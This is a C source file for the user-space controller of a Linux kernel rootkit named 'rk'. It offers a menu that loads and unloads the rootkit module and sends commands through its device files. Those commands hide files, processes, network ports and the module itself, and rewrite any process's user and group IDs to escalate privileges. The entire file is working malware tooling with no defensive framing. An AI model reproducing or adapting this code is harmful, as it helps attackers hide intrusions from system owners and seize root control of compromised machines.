#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <linux/limits.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdbool.h>

#include "../../LKM/src/ioctl.h"

#define FINIT_MODULE(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
#define DELETE_MODULE(name, flags) syscall(__NR_delete_module, name, flags)
#define HIDE_MODULE(name) syscall(__NR_read, 0xffffffff, name,0xeeeeeeee)

#define MODULE_NAME "rk"
#define CHRDEV_PATH "/dev/rootkitdev"
#define HIDE_PROC_PATH "/dev/rootkitdev_hp"
#define UNHIDE_PROC_PATH "/dev/rootkitdev_uhp"
#define HIDE_PORT_PATH "/proc/rootkitdev"
#define PROC_CRED_PATH "/dev/rootkitdev_ppe"

const char* commands_list = 
"Command List:\n"
"---------------------------\n"
"0 - Exit\n"
"1 - Init module\n"
"2 - Delete module\n"
"3 - Send ioctl code\n"
"4 - Hide process\n"
"5 - Unhide process\n"
"6 - Hide/Unhide port\n"
"7 - Hide/Unhide module\n"
"8 - Change process credentials\n";

const char* ioctl_commands = 
"\nIOCTL commands list:\n"
"---------------------------\n"
"0 - Back\n"
"1 - Test ioctl (Print static string into dmesg)\n"
"2 - Hide file\n"
"3 - Unhide file\n";

const char params[] = ""; 
char rk_elf_path[PATH_MAX+1] ={0};
bool init_flag;
int process_input(int input);

int main(int argc, char** argv){
    int driver_fd;

    if(argc<2){
        fprintf(stderr, "Usage: rk_controller rk.ko\n");
        return -1;
    }
    strncpy(rk_elf_path, argv[1], PATH_MAX);
     
    system("clear");
    while(true){
        int chosing;
        if(access(CHRDEV_PATH, F_OK)==0){
            printf("Module status: launched\n");
            init_flag = true;
        }else{
            printf("Module status: stopped\n");
            init_flag = false;
        }
        fflush(stdin);
        printf("%s",commands_list);
        printf("Enter command: ");
        scanf("%d", &chosing);
        system("clear");
        fprintf(stderr, "Last messages:\n");
        if (!process_input(chosing))
            break;
    }
    return 0;
}

int process_input(int choosing){
    switch(choosing){
        case 0:
            return 0;
            break;
        case 1:
        {
            int driver_fd = open(rk_elf_path, O_RDONLY);
            if(init_flag){
                fprintf(stderr, "Module already loaded\n");
                break;
            }
            if(FINIT_MODULE(driver_fd, params, 0)!=0){
                fprintf(stderr, "Error when loading kernel module %s\n", rk_elf_path);
                close(driver_fd);
                return -2;
            }
            close(driver_fd);
            printf("Module installed successfully\n");
        }
        break;
        case 2:
        {
            if(!init_flag){
                fprintf(stderr, "Module does not loaded\n");
                break;
            }
            if(DELETE_MODULE(MODULE_NAME, O_NONBLOCK)!=0){
                fprintf(stderr, "Error when unloading kernel module %s\n", rk_elf_path);
                return -3;
            }
            printf("Module uninstall successfully\n");
        }
        break;
        case 3:
        {
            int choice, fd, res;
            fflush(stdin);
            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            printf("%s",ioctl_commands);
            printf("Enter your choice: ");
            scanf("%d", &choice);

            if(!choice)
                break;

            fd = open(CHRDEV_PATH,0);
            if(fd == -1){
                fprintf(stderr, "Error when open %s file\n",CHRDEV_PATH);
                break;
            }
            switch (choice){
                case 1:
                {
                    res = ioctl(fd,IOCTL_TEST); 
                    if(res == -1){
                        system("clear");
                        fprintf(stderr, "Error when send IOCTL_TEST to driver\n");
                    }
                }
                break;
                case 2:
                {
                    char message[PATH_MAX+1] = {0};
                    int res;
                    printf("Enter filename to hide: ");
                    fflush(stdin);
                    scanf("%4096s", message);
                    res= ioctl(fd, IOCTL_HIDE_FILE, message);
                    system("clear");
                    if (res<0){
                        fprintf(stderr, "Error when send IOCTL_TEST to driver\n");
                    }
                }
                break;
                case 3:
                {
                    char message[PATH_MAX+1] = {0};
                    int res;
                    printf("Enter filename to unhide: ");
                    fflush(stdin);
                    scanf("%4096s", message);
                    res= ioctl(fd, IOCTL_UNHIDE_FILE, message);
                    system("clear");
                    if (res<0){
                        fprintf(stderr, "Error when send IOCTL_TEST to driver\n");
                    }

                }
                break;
                default:
                break;
            }
            close(fd);
        }
        break;
        case 4:
        {
            int fd =  open(HIDE_PROC_PATH,O_WRONLY);
            char message[PATH_MAX+1] = {0};

            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            fflush(stdin);
            printf("Enter pid or proc name to hide: ");
            scanf("%4096s", message);
            write(fd, message, strlen(message));
            close(fd);

        }
        break;
        case 5:
        {
            int fd =  open(UNHIDE_PROC_PATH,O_WRONLY);
            char message[PATH_MAX+1] = {0};

            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            fflush(stdin);
            printf("Enter pid or proc name to unhide: ");
            scanf("%4096s", message);
            write(fd, message, strlen(message));
            close(fd);
        }
        break;
        case 6:
        {
            int fd = open(HIDE_PORT_PATH, O_WRONLY);
            char message[7] = {0};
            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            fflush(stdin);
            printf("Enter R<port number> for hide/unhide remote port or L<port number> for hide/unhide local port: ");
            scanf("%6s", message);
            write(fd, message, strlen(message));
            close(fd);
        }
        break;
        case 7:
        {
            char message[257] = {0};
            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            fflush(stdin);
            printf("Enter enter module name for hide/unhide: ");
            scanf("%256s", message);
            HIDE_MODULE(message);
        }
        break;
        case 8:
        {
            int fd = open(PROC_CRED_PATH, O_WRONLY);
            unsigned int pid, uid, euid, gid, egid;
            char message[257] = {0};
            if(!init_flag){
                fprintf(stderr, "Error, module must be initialized\n");
                break;
            }
            fflush(stdin);
            printf("Enter <pid> <uid> <euid> <gid> <egid>: ");
            scanf("%d %d %d %d %d", &pid, &uid, &euid, &gid, &egid);
            sprintf(message, "%d %d %d %d %d", pid, uid, euid, gid, egid);
            write(fd, message, strlen(message));
            close(fd);
        }
        default:
            break;
    }
    return 1;
}
